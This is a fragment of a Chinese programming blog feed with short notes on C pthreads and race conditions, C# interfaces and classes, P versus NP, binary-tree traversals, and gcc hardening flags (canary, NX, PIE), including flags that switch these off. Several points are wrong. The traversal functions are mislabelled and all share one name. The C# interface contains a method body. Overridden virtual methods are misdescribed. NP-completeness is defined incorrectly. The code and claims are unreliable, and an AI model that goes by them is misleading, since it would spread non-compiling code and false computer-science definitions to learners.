class="line">}</span><br><span class="line">printf("%d\n",p_data->sum);</span><br><span class="line">return NULL;</span><br><span class="line">}</span><br><span class="line">int main(){</span><br><span class="line">int i=0;</span><br><span class="line">for(i = 0;i<10000;i++){</span><br><span class="line">arr[i] = rand() % 50;</span><br><span class="line">}</span><br><span class="line">pthread_t th1;</span><br><span class="line">pthread_t th2;</span><br><span class="line">Data d1 = { 0 , 5000 , 0 };</span><br><span class="line">Data d2 = { 5000 , 10000 , 0 };</span><br><span class="line">pthread_create(&th1,NULL,sum,&d1);</span><br><span class="line">pthread_create(&th2,NULL,sum,&d2);</span><br><span class="line">pthread_join(th1,NULL);</span><br><span class="line">pthread_join(th2,NULL);</span><br><span class="line">printf("answer is %d\n",d1.sum + d2.sum);</span><br><span class="line">return 0;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></div><p>运行结果：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">122607  </span><br><span class="line">122604</span><br><span class="line">answer is 245211</span><br></pre></td></tr></tbody></table></figure></div><p>对于上述代码，我们可以选择拆成更多的份数，这样效率理论上来说会更好。</p><h1 id="多线程可以提高程序的运行效率，但是可能会存在-竞态条件（race-condition）"><a href="#多线程可以提高程序的运行效率，但是可能会存在-竞态条件（race-condition）" class="headerlink" title="多线程可以提高程序的运行效率，但是可能会存在  竞态条件（race condition）"></a>多线程可以提高程序的运行效率，但是可能会存在  竞态条件（race condition）</h1><h1 id="简单来说，就是多线程对于共享数据的处理由于存在一定的次序和时间差，导致最终答案与预期答案出现偏差。"><a href="#简单来说，就是多线程对于共享数据的处理由于存在一定的次序和时间差，导致最终答案与预期答案出现偏差。" class="headerlink" title="简单来说，就是多线程对于共享数据的处理由于存在一定的次序和时间差，导致最终答案与预期答案出现偏差。"></a>简单来说，就是多线程对于共享数据的处理由于存在一定的次序和时间差，导致最终答案与预期答案出现偏差。</h1><h1 id="比如说-i-，假设i-0，在高速并行i-的情况下，当i-100时，执行了i-，于是i-101，但是可能存在一部分线程中i-99，于是这个线程执行i-，i又变成了100，所以和预期发生的偏差"><a href="#比如说-i-，假设i-0，在高速并行i-的情况下，当i-100时，执行了i-，于是i-101，但是可能存在一部分线程中i-99，于是这个线程执行i-，i又变成了100，所以和预期发生的偏差" class="headerlink" title="比如说 i++，假设i=0，在高速并行i++的情况下，当i=100时，执行了i++，于是i=101，但是可能存在一部分线程中i=99，于是这个线程执行i++，i又变成了100，所以和预期发生的偏差"></a>比如说 i++，假设i=0，在高速并行i++的情况下，当i=100时，执行了i++，于是i=101，但是可能存在一部分线程中i=99，于是这个线程执行i++，i又变成了100，所以和预期发生的偏差</h1><h1 id="另外多线程程序中还存在一种问题就是-假共享（False-Sharing），它是发生于Cache和RAM之间的读写校对延迟"><a href="#另外多线程程序中还存在一种问题就是-假共享（False-Sharing），它是发生于Cache和RAM之间的读写校对延迟" class="headerlink" title="另外多线程程序中还存在一种问题就是 假共享（False Sharing），它是发生于Cache和RAM之间的读写校对延迟"></a>另外多线程程序中还存在一种问题就是 假共享（False Sharing），它是发生于Cache和RAM之间的读写校对延迟</h1><h1 id="Cache是单条线程中高速读写的缓存，它会将RAM某地址之后长串的数据（不管后面数据有没有用）存入缓存中，然后对其进行读写，再写回RAM中"><a href="#Cache是单条线程中高速读写的缓存，它会将RAM某地址之后长串的数据（不管后面数据有没有用）存入缓存中，然后对其进行读写，再写回RAM中" class="headerlink" title="Cache是单条线程中高速读写的缓存，它会将RAM某地址之后长串的数据（不管后面数据有没有用）存入缓存中，然后对其进行读写，再写回RAM中"></a>Cache是单条线程中高速读写的缓存，它会将RAM某地址之后长串的数据（不管后面数据有没有用）存入缓存中，然后对其进行读写，再写回RAM中</h1><h1 id="它经常发生在数据之间很近，且为多核运算时。"><a href="#它经常发生在数据之间很近，且为多核运算时。" class="headerlink" title="它经常发生在数据之间很近，且为多核运算时。"></a>它经常发生在数据之间很近，且为多核运算时。</h1><h1 id="解决方法：我们可以扩大共同数据之间的距离大小，或者少使用共同数据。"><a href="#解决方法：我们可以扩大共同数据之间的距离大小，或者少使用共同数据。" class="headerlink" title="解决方法：我们可以扩大共同数据之间的距离大小，或者少使用共同数据。"></a>解决方法：我们可以扩大共同数据之间的距离大小，或者少使用共同数据。</h1></body></html>]]></content>
      
      
      <categories>
          
          <category> C语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C语言 </tag>
            
            <tag> 多线程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>狭义相对论-洛伦兹变换</title>
      <link href="/2019/01/08/%E7%8B%AD%E4%B9%89%E7%9B%B8%E5%AF%B9%E8%AE%BA-%E6%B4%9B%E4%BC%A6%E5%85%B9%E5%8F%98%E6%8D%A2/"/>
      <url>/2019/01/08/%E7%8B%AD%E4%B9%89%E7%9B%B8%E5%AF%B9%E8%AE%BA-%E6%B4%9B%E4%BC%A6%E5%85%B9%E5%8F%98%E6%8D%A2/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><p><a href="/2019/01/08/%E7%8B%AD%E4%B9%89%E7%9B%B8%E5%AF%B9%E8%AE%BA-%E6%B4%9B%E4%BC%A6%E5%85%B9%E5%8F%98%E6%8D%A2/1.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/01/08/%E7%8B%AD%E4%B9%89%E7%9B%B8%E5%AF%B9%E8%AE%BA-%E6%B4%9B%E4%BC%A6%E5%85%B9%E5%8F%98%E6%8D%A2/1.jpg" class="lazyload"></a></p></body></html>]]></content>
      
      
      <categories>
          
          <category> 狭义相对论 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 狭义相对论 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSharp-接口</title>
      <link href="/2019/01/05/CSharp-%E6%8E%A5%E5%8F%A3/"/>
      <url>/2019/01/05/CSharp-%E6%8E%A5%E5%8F%A3/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h1 id="接口的格式"><a href="#接口的格式" class="headerlink" title="接口的格式"></a>接口的格式</h1><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">修饰符 interface 接口名称: 继承的接口列表</span><br><span class="line">{</span><br><span class="line">接口内容;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></div><h1 id="例如："><a href="#例如：" class="headerlink" title="例如："></a>例如：</h1><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">interface MyInterface{</span><br><span class="line">string ID</span><br><span class="line">{</span><br><span class="line">get;</span><br><span class="line">set;</span><br><span class="line">}</span><br><span class="line">string Name</span><br><span class="line">{</span><br><span class="line">get;</span><br><span class="line">set;</span><br><span class="line">}</span><br><span class="line">void ShowInfo(); </span><br><span class="line">{</span><br><span class="line">Console.WriteLine("编号\t 姓名");</span><br><span class="line">Console.WriteLine(ID + "\t" + Name);</span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></div></body></html>]]></content>
      
      
      <categories>
          
          <category> C# </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C# </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSharp-类</title>
      <link href="/2019/01/05/CSharp-%E7%B1%BB/"/>
      <url>/2019/01/05/CSharp-%E7%B1%BB/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h2 id="类的封装"><a href="#类的封装" class="headerlink" title="类的封装"></a>类的封装</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">class A {</span><br><span class="line">    private int x = 0;</span><br><span class="line">    private int y = 0;</span><br><span class="line">    public int X {</span><br><span class="line">        get {</span><br><span class="line">            return x;</span><br><span class="line">        }</span><br><span class="line">        set {</span><br><span class="line">            x = value;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    public virtual void printX() {</span><br><span class="line">        Console.WriteLine(x);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">class Program</span><br><span class="line">{</span><br><span class="line">    static void Main(string[] args)</span><br><span class="line">    {</span><br><span class="line">        A test = new A();</span><br><span class="line">        test.X = 1;</span><br><span class="line">        test.printX();</span><br><span class="line">        Console.ReadLine();</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></div><h1 id="执行结果：1"><a href="#执行结果：1" class="headerlink" title="执行结果：1"></a>执行结果：1</h1><h1 id="总结：我们可以设置一个属性值来对-private变量-进行赋值，和函数的区别主要在于声明时没有括号，内部由-get-set-组成。"><a href="#总结：我们可以设置一个属性值来对-private变量-进行赋值，和函数的区别主要在于声明时没有括号，内部由-get-set-组成。" class="headerlink" title="总结：我们可以设置一个属性值来对 private变量 进行赋值，和函数的区别主要在于声明时没有括号，内部由 get set 组成。"></a>总结：我们可以设置一个属性值来对 private变量 进行赋值，和函数的区别主要在于声明时没有括号，内部由 get set 组成。</h1><h2 id="类的强制转化-子类到基类"><a href="#类的强制转化-子类到基类" class="headerlink" title="类的强制转化-子类到基类"></a>类的强制转化-子类到基类</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">class A {</span><br><span class="line">    private int x = 0;</span><br><span class="line">    private int y = 0;</span><br><span class="line">    public int X {</span><br><span class="line">        get {</span><br><span class="line">            return x;</span><br><span class="line">        }</span><br><span class="line">        set {</span><br><span class="line">            x = value;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    public virtual void printX() {</span><br><span class="line">        Console.WriteLine(x);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line">class B :A {</span><br><span class="line">    public new void printX() {</span><br><span class="line">        Console.WriteLine("I am B!");</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">class Program</span><br><span class="line">{</span><br><span class="line">    static void Main(string[] args)</span><br><span class="line">    {</span><br><span class="line">        B test1 = new B();</span><br><span class="line">        test1.X = 1;</span><br><span class="line">        A test2 = (A)test1;</span><br><span class="line">        test2.printX();</span><br><span class="line">        Console.ReadLine();</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></div><h1 id="执行结果：1-1"><a href="#执行结果：1-1" class="headerlink" title="执行结果：1"></a>执行结果：1</h1><h1 id="总结：子类转化为基类后，变量保留，方法全部为基类方法，包括重写的虚函数。"><a href="#总结：子类转化为基类后，变量保留，方法全部为基类方法，包括重写的虚函数。" class="headerlink" title="总结：子类转化为基类后，变量保留，方法全部为基类方法，包括重写的虚函数。"></a>总结：子类转化为基类后，变量保留，方法全部为基类方法，包括重写的虚函数。</h1><h2 id="虚函数的特点"><a href="#虚函数的特点" class="headerlink" title="虚函数的特点"></a>虚函数的特点</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">class A {</span><br><span class="line">    public virtual void sum() {</span><br><span class="line">        Console.WriteLine("I am A!");</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line">class B : A {</span><br><span class="line">    public new void sum() {</span><br><span class="line">        Console.WriteLine("I am B!");</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line">class Program</span><br><span class="line">{</span><br><span class="line">    static void Main(string[] args)</span><br><span class="line">    {</span><br><span class="line">        B test = new B();</span><br><span class="line">        test.sum();</span><br><span class="line">        Console.ReadLine();</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></div><h1 id="执行结果：I-am-B"><a href="#执行结果：I-am-B" class="headerlink" title="执行结果：I am B!"></a>执行结果：I am B!</h1><h1 id="总结：可见-virtual-可以使类中的该方法在继承后可重写，即在要重写的函数前加-new-或-override-关键字即可"><a href="#总结：可见-virtual-可以使类中的该方法在继承后可重写，即在要重写的函数前加-new-或-override-关键字即可" class="headerlink" title="总结：可见 virtual 可以使类中的该方法在继承后可重写，即在要重写的函数前加 new 或 override 关键字即可"></a>总结：可见 virtual 可以使类中的该方法在继承后可重写，即在要重写的函数前加 new 或 override 关键字即可</h1></body></html>]]></content>
      
      
      <categories>
          
          <category> C# </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C# </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据结构-P和NP问题</title>
      <link href="/2018/12/31/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-P%E5%92%8CNP%E9%97%AE%E9%A2%98/"/>
      <url>/2018/12/31/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-P%E5%92%8CNP%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h2 id="论P类问题和NP类问题"><a href="#论P类问题和NP类问题" class="headerlink" title="论P类问题和NP类问题"></a>论P类问题和NP类问题</h2><p>很多人认为NP问题就是在P时间内解不出来的问题<br>P是Polynomial（翻译：多项式），Polynomial time是多项式时间的意思<br>所以P类问题是在多项式时间内可以求解的判定问题是P类问题，简单说就是在o（1）、o（n）、o（logN）、o（NlogN）、o（n^2）、o（n^3）、o（n^4）……内可以解决的问题则为P类问题，o（2^n）则不是P类问题<br>比如：<br>    给你一个数组arr[n]，让你求解里面的最大值<br>    我们可以设计一个o（n）的算法，即设定m = arr[0]为最大值，然后不断向后遍历，如果有一个量比m大，为 m = 这个量<br>    我们只需要设计一个for循环即可。<br>    由于这个题目可以在o（n）内解决，所以这个题目为P类问题</p><p>NP类问题，NP其实是Nondeterministic Polynomial，而不是non Polynomial<br>定义：如果有一个问题和一个解，我们可以在多项式时间内来确定一个解是否是这个问题的解<br>比如:<br>    给你一个数组arr[n]，和x=9，请确定arr[n]中的最大值是否为x<br>    同理，我们可以设置一个for循环，来解决这个问题<br>总结：最大值问题是P类问题，也是NP类问题</p><p>再举一个例子<br>    中位数（median）<br>    给你一个数组arr[n]，求出中位数m<br>    首先我们确定一下是不是P类问题<br>        （1）我们可以先排序（sort）【o（NlogN）】<br>        （2）arr[n/2]【o（1）】<br>    所以这个问题是P类问题</p><pre><code>我们再确认一个是不是NP类问题。    （1）随便找一个数字x = 9    （2）判断x是否是中位数，我们只需找出多少个比9大和多少个比9小的数量，若相等则为中位数【o（N）】所以这个问题也可以是NP类问题。</code></pre><p>为什么有人认为NP类问题是在o（）时间内无法解决的问题呢？<br>    因为他们把NP类问题和NP完全问题（Nondeterministic Polynomial Complete）混在了一起，这两者不是等价的。<br>    NP完全问题的定义：我们无法在P时间（Polynomial Time）内将问题解出，但是我们可以验证X是不是这个问题的解。</p><p>总结：NP类问题包括P类问题，NP类问题含有P类问题和NP Complete问题。</p><p>这里我们举一个NP Complete问题<br>SAT问题：<br>    给你很多boolean变量 x1,x2,x3,……,xn<br>    现在将所有的boolean的变量组合成CNF算式<br>    在括号中随意放3个xn，且括号的数量可以无限，例如<br>    （x1 || x2 || x3）&&（x1 || !x2 || !x3）&&（!x1 || x4 || x5）<br>    问是否存在 x1……x5 使得上述式子等于true<br>    因为我们可以在0（1）内判断是否为true，所以是NP类问题，<br>    但是x1……x5，我们无法确定是多少，只能不断枚举爆破，所以求出答案的过程需要o（2^n）很明显这个不是一个多项式时间问题了，所以这个问题不是P类问题。</p></body></html>]]></content>
      
      
      <categories>
          
          <category> 计算机理论 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机理论 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据结构-二叉树</title>
      <link href="/2018/12/29/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E4%BA%8C%E5%8F%89%E6%A0%91/"/>
      <url>/2018/12/29/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E4%BA%8C%E5%8F%89%E6%A0%91/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h2 id="一、二叉树的建立"><a href="#一、二叉树的建立" class="headerlink" title="一、二叉树的建立"></a>一、二叉树的建立</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">struct Node{</span><br><span class="line">ElementType Element;</span><br><span class="line">Position Left;</span><br><span class="line">Position Right;</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure></div><p>由上述代码，我们可以知道一个节点上有指向下层的左右指针和自身的数据<br>对于二叉树的遍历，有先序遍历（Preorder Traversal），中序遍历（Inorder Traversal），后序遍历（Postorder Traversal）三中基本方式</p><h1 id="先序遍历"><a href="#先序遍历" class="headerlink" title="先序遍历"></a>先序遍历</h1><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">void Preorder(struct node){</span><br><span class="line">Position Tmp;</span><br><span class="line">Tmp = node;</span><br><span class="line">if(Node != NULL){</span><br><span class="line">Preorder(Tmp->Left);</span><br><span class="line">printf("%3d",Tmp->Element);</span><br><span class="line">Preorder(Tmp->Right);</span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></div><h1 id="中序遍历"><a href="#中序遍历" class="headerlink" title="中序遍历"></a>中序遍历</h1><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">void Preorder(struct node){</span><br><span class="line">Position Tmp;</span><br><span class="line">Tmp = node;</span><br><span class="line">if(Node != NULL){</span><br><span class="line">printf("%3d",Tmp->Element);</span><br><span class="line">Preorder(Tmp->Left);</span><br><span class="line">Preorder(Tmp->Right);</span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></div><h1 id="后序遍历"><a href="#后序遍历" class="headerlink" title="后序遍历"></a>后序遍历</h1><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">void Preorder(struct node){</span><br><span class="line">Position Tmp;</span><br><span class="line">Tmp = node;</span><br><span class="line">if(Node != NULL){</span><br><span class="line">Preorder(Tmp->Left);</span><br><span class="line">Preorder(Tmp->Right);</span><br><span class="line">printf("%3d",Tmp->Element);</span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></div></body></html>]]></content>
      
      
      <categories>
          
          <category> 数据结构 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据结构 </tag>
            
            <tag> 二叉树 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux-Vim指令</title>
      <link href="/2018/12/25/Linux-Vim%E6%8C%87%E4%BB%A4/"/>
      <url>/2018/12/25/Linux-Vim%E6%8C%87%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><p><a href="/2018/12/25/Linux-Vim%E6%8C%87%E4%BB%A4/1.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/12/25/Linux-Vim%E6%8C%87%E4%BB%A4/1.jpg" class="lazyload"></a></p></body></html>]]></content>
      
      
      <categories>
          
          <category> 常识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vim </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux-编译保护</title>
      <link href="/2018/12/24/Linux-%E7%BC%96%E8%AF%91%E4%BF%9D%E6%8A%A4/"/>
      <url>/2018/12/24/Linux-%E7%BC%96%E8%AF%91%E4%BF%9D%E6%8A%A4/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h3 id="gcc的编译关于程序保护开启的选项"><a href="#gcc的编译关于程序保护开启的选项" class="headerlink" title="gcc的编译关于程序保护开启的选项"></a>gcc的编译关于程序保护开启的选项</h3><h2 id="·CANNARY-栈保护"><a href="#·CANNARY-栈保护" class="headerlink" title="·CANNARY(栈保护)"></a>·CANNARY(栈保护)</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gcc -o test test.c // 默认情况下，不开启Canary保护 </span><br><span class="line">gcc -fno-stack-protector -o test test.c //禁用栈保护 </span><br><span class="line">gcc -fstack-protector -o test test.c //启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码 </span><br><span class="line">gcc -fstack-protector-all -o test test.c //启用堆栈保护，为所有函数插入保护代码</span><br></pre></td></tr></tbody></table></figure></div><h2 id="·NX（DEP）"><a href="#·NX（DEP）" class="headerlink" title="·NX（DEP）"></a>·NX（DEP）</h2><p>NX即No-eXecute（不可执行）的意思，NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。</p><p>gcc编译器默认开启了NX选项，如果需要关闭NX选项，可以给gcc编译器添加-z execstack参数。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gcc -o test test.c// 默认情况下，开启NX保护</span><br><span class="line">gcc -z execstack -o test test.c// 禁用NX保护</span><br><span class="line">gcc -z noexecstack -o test test.c// 开启NX保护</span><br></pre></td></tr></tbody></table></figure></div><h2 id="·PIE（ASLR）"><a href="#·PIE（ASLR）" class="headerlink" title="·PIE（ASLR）"></a>·PIE（ASLR）</h2><p>一般情况下NX（Windows平台上称其为DEP）和地址空间分布随机化（ASLR）会同时工作。<br>内存地址随机化机制（address space layout randomization)，有以下三种情况</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0 - 表示关闭进程地址空间随机化。</span><br><span class="line">1 - 表示将mmap的基址，stack和vdso页面随机化。</span><br><span class="line">2 - 表示在1的基础上增加栈（heap）的随机化。</span><br><span class="line">可以防范基于Ret2libc方式的针对DEP的攻击。ASLR和DEP配合使用，能有效阻止攻击者在堆栈上运行恶意代码。</span><br></pre></td></tr></tbody></table></figure></div><p>Built as PIE：位置独立的可执行区域（position-independent executables）。这样使得在利用缓冲溢出和移动操作系统中存在的其他内存崩溃缺陷时采用面向返回的编程（return-oriented programming）方法变得难得多。<br>liunx下关闭PIE的命令如下：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">gcc -o test test.c// 默认情况下，开启PIE保护</span><br><span class="line">gcc -pie -o test test.c// 开启PIE保护</span><br><span class="line">gcc -no-pie -o test test.c// 禁用PIE保护</span><br><span class="line"></span><br><span class="line">//以下为PIE所有保护操作</span><br><span class="line">gcc -o test test.c // 默认情况下，不开启PIE</span><br><span class="line">gcc -fpie -pie -o test test.c // 开启PIE，此时强度为1</span><br><span class="line">gcc -fPIE -pie -o test test.c // 开启PIE，此时为最高强度2</span><br><span class="line">gcc -fpic -o test test.c // 开启PIC，此时强度为1，不会开启PIE</span><br><span class="line">gcc -fPIC -o test test.c // 开启PIC，此时为最高强度2，不会开启PIE</span><br></pre></td></tr></tbody></table></figure></div><h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><h3 id="PIE最早由RedHat的人实现，他在连接起上增加了-pie选项，这样使用-fPIE编译的对象就能通过连接器得到位置无关可执行程序。fPIE和fPIC有些不同。可以参考Gcc和Open64中的-fPIC选项"><a href="#PIE最早由RedHat的人实现，他在连接起上增加了-pie选项，这样使用-fPIE编译的对象就能通过连接器得到位置无关可执行程序。fPIE和fPIC有些不同。可以参考Gcc和Open64中的-fPIC选项" class="headerlink" 